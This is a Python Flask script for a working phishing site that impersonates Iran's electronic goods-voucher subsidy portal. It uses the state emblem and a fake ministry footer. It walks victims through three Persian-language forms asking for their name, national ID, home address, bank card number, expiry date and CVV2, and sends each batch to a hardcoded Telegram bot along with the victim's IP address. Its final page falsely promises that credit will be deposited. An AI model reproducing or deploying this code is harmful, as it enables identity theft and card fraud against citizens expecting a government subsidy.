import requests
from flask import Flask, request

BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
CHAT_ID   = "2028533085"

app = Flask(__name__)

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text},
            timeout=5,
        )
    except:
        pass

# ====== استایل مشترک ======
common_style = """
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
<style>
  * { box-sizing: border-box; }
  body { font-family: 'Vazirmatn', sans-serif; background: #eef1f5; margin: 0; padding: 0; color: #333; }
  .header { background: #fff; border-bottom: 3px solid #005a9c; padding: 15px 0; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
  .header img { height: 60px; }
  .header h1 { font-size: 18px; margin: 10px 0 0 0; color: #005a9c; font-weight: bold; }
  .main-container { max-width: 500px; margin: 30px auto; background: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
  .card-header { background: #005a9c; color: #fff; padding: 15px; font-size: 16px; font-weight: bold; text-align: center; }
  .card-body { padding: 25px; }
  .form-group { margin-bottom: 20px; }
  .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: bold; color: #444; }
  .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-family: inherit; font-size: 14px; transition: border 0.3s; }
  .form-group input:focus { border-color: #005a9c; outline: none; }
  .btn { width: 100%; padding: 14px; background: #28a745; color: #fff; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; font-family: inherit; transition: background 0.3s; }
  .btn:hover { background: #218838; }
  .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #777; padding-bottom: 20px; }
</style>
"""

# ====== صفحه اول: اطلاعات هویتی ======
html_step1 = f"""
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سامانه کالابرگ الکترونیکی</title>
{common_style}
</head>
<body>
<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Emblem_of_Iran.svg/200px-Emblem_of_Iran.svg.png" alt="لوگو">
  <h1>سامانه کالابرگ الکترونیکی</h1>
</div>
<div class="main-container">
  <div class="card-header">ثبت‌نام و احراز هویت</div>
  <div class="card-body">
    <form method="POST" action="/step2">
      <div class="form-group">
        <label>نام</label>
        <input type="text" name="first_name" required placeholder="نام خود را وارد کنید">
      </div>
      <div class="form-group">
        <label>نام خانوادگی</label>
        <input type="text" name="last_name" required placeholder="نام خانوادگی خود را وارد کنید">
      </div>
      <div class="form-group">
        <label>کد ملی</label>
        <input type="text" name="national_id" required placeholder="کد ملی ۱۰ رقمی" maxlength="10">
      </div>
      <button type="submit" class="btn">مرحله بعد</button>
    </form>
  </div>
</div>
<div class="footer">تمامی حقوق محفوظ است © وزارت تعاون، کار و رفاه اجتماعی</div>
</body>
</html>
"""

# ====== صفحه دوم: آدرس ======
html_step2 = f"""
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سامانه کالابرگ الکترونیکی</title>
{common_style}
</head>
<body>
<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Emblem_of_Iran.svg/200px-Emblem_of_Iran.svg.png" alt="لوگو">
  <h1>سامانه کالابرگ الکترونیکی</h1>
</div>
<div class="main-container">
  <div class="card-header">اطلاعات محل سکونت</div>
  <div class="card-body">
    <form method="POST" action="/step3">
      <div class="form-group">
        <label>استان / شهر</label>
        <input type="text" name="city" required placeholder="مثلاً: تهران">
      </div>
      <div class="form-group">
        <label>آدرس دقیق</label>
        <input type="text" name="address" required placeholder="خیابان، کوچه، پلاک، واحد">
      </div>
      <div class="form-group">
        <label>کد پستی</label>
        <input type="text" name="postal_code" placeholder="کد پستی ۱۰ رقمی" maxlength="10">
      </div>
      <button type="submit" class="btn">تایید و ادامه</button>
    </form>
  </div>
</div>
<div class="footer">تمامی حقوق محفوظ است © وزارت تعاون، کار و رفاه اجتماعی</div>
</body>
</html>
"""

# ====== صفحه سوم: کارت بانکی ======
html_step3 = f"""
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سامانه کالابرگ الکترونیکی</title>
{common_style}
</head>
<body>
<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Emblem_of_Iran.svg/200px-Emblem_of_Iran.svg.png" alt="لوگو">
  <h1>سامانه کالابرگ الکترونیکی</h1>
</div>
<div class="main-container">
  <div class="card-header">ثبت شماره کارت جهت دریافت یارانه</div>
  <div class="card-body">
    <form method="POST" action="/finish">
      <div class="form-group">
        <label>شماره کارت</label>
        <input type="text" name="card_number" required placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="16" style="text-align: left; direction: ltr;">
      </div>
      <div class="form-group">
        <label>تاریخ انقضا</label>
        <input type="text" name="expiry" required placeholder="MM/YY" maxlength="5" style="text-align: left; direction: ltr;">
      </div>
      <div class="form-group">
        <label>CVV2 (کد روی کارت)</label>
        <input type="password" name="cvv2" required placeholder="***" maxlength="4" style="text-align: left; direction: ltr;">
      </div>
      <button type="submit" class="btn">ثبت نهایی و دریافت اعتبار</button>
    </form>
  </div>
</div>
<div class="footer">تمامی حقوق محفوظ است © وزارت تعاون، کار و رفاه اجتماعی</div>
</body>
</html>
"""

@app.route("/")
def home():
    return html_step1

@app.route("/step2", methods=["POST"])
def step2():
    fname = request.form.get("first_name", "")
    lname = request.form.get("last_name", "")
    nid = request.form.get("national_id", "")
    ip = request.remote_addr

    send_telegram(
        f"🪪 **اطلاعات هویتی (کالابرگ)**\n\n"
        f"👤 نام: {fname}\n"
        f"👤 نام خانوادگی: {lname}\n"
        f"🆔 کد ملی: {nid}\n"
        f"🌐 IP: {ip}"
    )
    return html_step2

@app.route("/step3", methods=["POST"])
def step3():
    city = request.form.get("city", "")
    addr = request.form.get("address", "")
    postal = request.form.get("postal_code", "")
    ip = request.remote_addr

    send_telegram(
        f"📍 **اطلاعات آدرس**\n\n"
        f"🏙️ شهر: {city}\n"
        f"🏠 آدرس: {addr}\n"
        f"📮 کد پستی: {postal}\n"
        f"🌐 IP: {ip}"
    )
    return html_step3

@app.route("/finish", methods=["POST"])
def finish():
    card = request.form.get("card_number", "")
    exp = request.form.get("expiry", "")
    cvv = request.form.get("cvv2", "")
    ip = request.remote_addr

    send_telegram(
        f"💳 **اطلاعات بانکی**\n\n"
        f"💳 شماره کارت: {card}\n"
        f"📅 تاریخ انقضا: {exp}\n"
        f"🔐 CVV2: {cvv}\n"
        f"🌐 IP: {ip}"
    )
    
    return """
    <html lang="fa" dir="rtl">
    <head>
    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
    <style>body { font-family: 'Vazirmatn', sans-serif; text-align: center; padding: 50px; background: #eef1f5; }</style>
    </head>
    <body>
        <h2 style="color: #28a745;">ثبت اطلاعات با موفقیت انجام شد</h2>
        <p style="color: #555;">اعتبار کالابرگ به حساب شما واریز خواهد شد. لطفا منتظر بمانید.</p>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
